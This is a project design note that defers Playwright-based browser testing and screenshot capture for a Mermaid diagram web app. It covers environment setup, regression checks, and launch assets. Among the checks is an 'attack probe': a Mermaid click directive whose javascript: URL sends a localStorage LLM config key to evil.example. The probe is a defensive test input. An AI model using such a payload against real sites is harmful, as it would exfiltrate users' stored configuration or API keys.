# Deferred — Visual verification & screenshot capture (Playwright)

**Status:** deliberately postponed on 2026-08-21. Everything else in the Track 2 scope went ahead
without it. Pick this up when you need launch assets, or the next time a rendering change needs
real-browser proof.

---

## Why this exists

Two separate needs, one tool:

**1. Launch assets.** Screenshots and a short GIF/clip for the README and a LinkedIn post. Not needed
until the post is being written.

**2. Verification we currently cannot do.** This is the part with ongoing value. The test suite runs
in **jsdom, which has no SVG layout APIs** — no `getBBox`, no `getComputedTextLength`. Measured: 20 of
29 diagram templates fail to render there, *identically* under `securityLevel: 'loose'` and `'strict'`.

That means the Mermaid `strict` change (`src/services/mermaid.ts`) was verified by **reading Mermaid's
source**, not by executing it:

- `formatUrl` — `node_modules/mermaid/dist/chunks/mermaid.core/chunk-ICXQ74PX.mjs:147`
- `sanitizeMore` — `chunk-WYO6CB5R.mjs:5057`
- `setClickFun` — `chunk-PUDLZKDR.mjs:444`

All three gate on `securityLevel`. The reasoning is solid but it is not an executed test. A real
browser closes that gap permanently.

---

## Environment (already checked, 2026-08-21)

| Fact | Value |
|---|---|
| Playwright CLI | resolves, v1.62.1 |
| Playwright browser binaries | **not cached** (`ms-playwright` folder absent) |
| System Chrome | ✅ `C:\Program Files\Google\Chrome\Application\chrome.exe` |
| System Edge | ✅ `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` |

**Consequence:** use `channel: 'chrome'` to drive the installed browser. This skips the ~150 MB
binary download that `npx playwright install chromium` would trigger.

---

## Setup

```bash
npm i -D playwright
```

Do **not** run `npx playwright install` unless `channel: 'chrome'` turns out to be unreliable.

```ts
const browser = await chromium.launch({ channel: 'chrome' });
```

---

## Task A — Visual regression verification

Add a script (not part of `npm run test`; jsdom stays the default runner) that:

1. Starts the dev server (`npm run dev`, port 5173) or serves `dist/` after a build.
2. Seeds `localStorage` before load so the app starts in a known state — mermaid code, summary,
   theme. Keys are in `STORAGE_KEYS` (`src/utils/constants.ts`).
3. For each of the 29 types in `ALL_DIAGRAM_TYPES`, sets the template and screenshots the diagram
   panel.
4. Writes to a gitignored folder, e.g. `.screenshots/`.

**The specific checks that jsdom cannot do:**

- All 29 templates actually render in a real browser under `securityLevel: 'strict'` (only 9 could be
  confirmed in jsdom).
- Safe formatting still survives DOMPurify — a label containing `<br/>`, `<b>`, `<i>` must still
  render as formatting, not as escaped text.
- **The attack probe.** Render this and assert no `javascript:` href reaches the DOM:

  ```
  flowchart TD
      A[Click me] --> B[Done]
      click A "javascript:fetch('https://evil.example/?k='+localStorage.getItem('diagramsmith-llm-config'))"
  ```

  Expect the href to be absent or rewritten to `about:blank` by `@braintree/sanitize-url`.
  Under the old `loose` setting it would appear raw. This is the one test that proves the fix.

- Pan/zoom behaviour after the Track 2 fixes: dragging in empty space around the diagram pans
  (the `canvas: true` change), and zoom/pan survive a re-render instead of snapping back to 250%.

---

## Task B — Launch assets

Only when writing the LinkedIn post / README.

- Hero screenshot: split view, dark theme, a good-looking flowchart, prompt bar visible.
- Light theme equivalent.
- Version History modal with a diff open.
- Short clip: type a natural-language instruction → diagram updates. Capture with Playwright video
  (`recordVideo`) or a screen recorder, then convert to GIF.
- Output to `public/` and reference from `README.md`.

Suggested viewport: 1440×900. Use `deviceScaleFactor: 2` for crisp assets.

---

## Notes / gotchas

- The app is fully client-side with `base: '/DiagramSmith/'` in `vite.config.ts`. When serving
  `dist/` directly, respect that base path or routes/assets 404.
- Mermaid chunks load dynamically at runtime (see the `optimizeDeps.exclude` comment in
  `vite.config.ts`). Wait for the SVG to appear rather than for `networkidle`.
- The diagram panel re-renders on a 400 ms debounce — wait for the `<svg>` element, not a fixed sleep.
- Keep this out of CI. It needs a real browser and would make the workflow slow and flaky; the
  jsdom suite stays the fast gate.
